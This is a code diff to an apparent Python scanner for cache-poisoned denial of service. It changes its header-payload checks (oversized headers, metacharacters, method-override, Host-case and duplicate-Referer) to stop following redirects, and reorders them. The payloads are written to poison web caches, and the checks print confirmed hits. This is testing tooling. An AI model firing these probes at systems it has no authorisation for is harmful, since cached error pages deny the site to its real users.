@@ -21,7 +21,7 @@ def HHO(url, s, main_status_code, authent):
 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"""
         h = {"X-Oversized-Header-{}".format(i):"{}".format(big_value)}
         try:
-            req_hho = s.get(url, headers=h, auth=authent)
+            req_hho = s.get(url, headers=h, auth=authent, allow_redirects=False)
             #print(req_hho.status_code)
             #print(h)
             if req_hho.status_code in [400, 413, 500, 502] and req_hho.status_code != main_status_code:
@@ -45,7 +45,7 @@ def HMC(url, s, main_status_code, authent):
     chars = [r"\n", r"\a", r"\r"]
     for c in chars:
         headers = {"X-Metachar-Header": c}
-        req_hmc = s.get(url, headers=headers, timeout=10, verify=False, auth=authent)
+        req_hmc = s.get(url, headers=headers, timeout=10, verify=False, auth=authent, allow_redirects=False)
         if req_hmc.status_code in [400, 413, 500] and req_hmc.status_code != main_status_code:
             req_verify_hmc = s.get(url, verify=False, timeout=10, auth=authent)
             if req_verify_hmc.status_code == req_hmc.status_code:
@@ -56,27 +56,14 @@ def HMO(url, s, main_status_code, authent):
     methods = ["POST", "PUT", "HELP", "DELETE"]
     for m in methods:
         headers = {"X-HTTP-Method-Overcide": m}
-        req_hmo = s.get(url, headers=headers, verify=False, timeout=10, auth=authent)
+        req_hmo = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
         if req_hmo.status_code in [404, 405] and req_hmo.status_code != main_status_code:
             req_verify_hmo = s.get(url, verify=False, timeout=10, auth=authent)
             if req_verify_hmo.status_code == req_hmo.status_code:
                 print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | HMO DOS | \033[34m{}\033[0m | PAYLOAD: {}".format(url, headers))
 
 
-def RefDos(url, s, main_status_code, authent):
-    headers = {
-    "Referer": "xy",
-    "Referer": "x"
-    }
-    req_ref = s.get(url, headers=headers, verify=False, timeout=10, auth=authent)
-    if req_ref.status_code == 400 and req_ref.status_code != main_status_code:
-        print("   └── \033[31m{} with header {} response 400\033[0m".format(url, headers))
-        for rf in req_ref.headers:
-            if "cache" in rf.lower():
-                if "hit" in req_ref.headers[rf].lower():
-                    print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | RefDos | \033[34m{}\033[0m | PAYLOAD: {}".format(url, headers))
-
-def HHCN(url, s, req_len, authent):
+def HHCN(url, s, authent):
     #Host Header case normalization
 
     behavior = False
@@ -93,6 +80,10 @@ def HHCN(url, s, req_len, authent):
     domain = domain[:index] + letter + domain[index + 1:]
 
     headers = {"Host": domain}
+    
+    req_main = s.get(url, verify=False, timeout=10, auth=authent, allow_redirects=False)
+    req_len = len(req_main.content)
+
     req_hhcn = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
     if len(req_hhcn.content) != req_len:
         for rf in req_hhcn.headers:
@@ -100,12 +91,29 @@ def HHCN(url, s, req_len, authent):
                 behavior = True
                 for x in range(0, 10):
                     req_hhcn = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
+
         req_verify = s.get(url, verify=False, timeout=10, auth=authent)
+
         if len(req_hhcn.content) == len(req_verify.content):
             print(" \033[31m└── VULNERABILITY CONFIRMED\033[0m | HHCN | \033[34m{}\033[0m | {}b <> {}b | PAYLOAD: {}".format(url, req_len, len(req_verify.content), headers))
         else:
             if behavior:
                 print(" \033[33m└── INTERESTING BEHAVIOR\033[0m | HHCN | \033[34m{}\033[0m | PAYLOAD: {}".format(url, headers))
+
+
+
+def RefDos(url, s, main_status_code, authent):
+    headers = {
+    "Referer": "xy",
+    "Referer": "x"
+    }
+    req_ref = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
+    if req_ref.status_code == 400 and req_ref.status_code != main_status_code:
+        print("   └── \033[31m{} with header {} response 400\033[0m".format(url, headers))
+        for rf in req_ref.headers:
+            if "cache" in rf.lower():
+                if "hit" in req_ref.headers[rf].lower():
+                    print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | RefDos | \033[34m{}\033[0m | PAYLOAD: {}".format(url, headers))
 
 
 
@@ -187,5 +195,5 @@ def check_CPDoS(url, s, req_main, domain, custom_header, authent):
     HHO(url, s, main_status_code, authent)
     HMC(url, s, main_status_code, authent)
     HMO(url, s, main_status_code, authent)
+    HHCN(url, s, authent)
     RefDos(url, s, main_status_code, authent)
-    HHCN(url, s, req_len, authent)
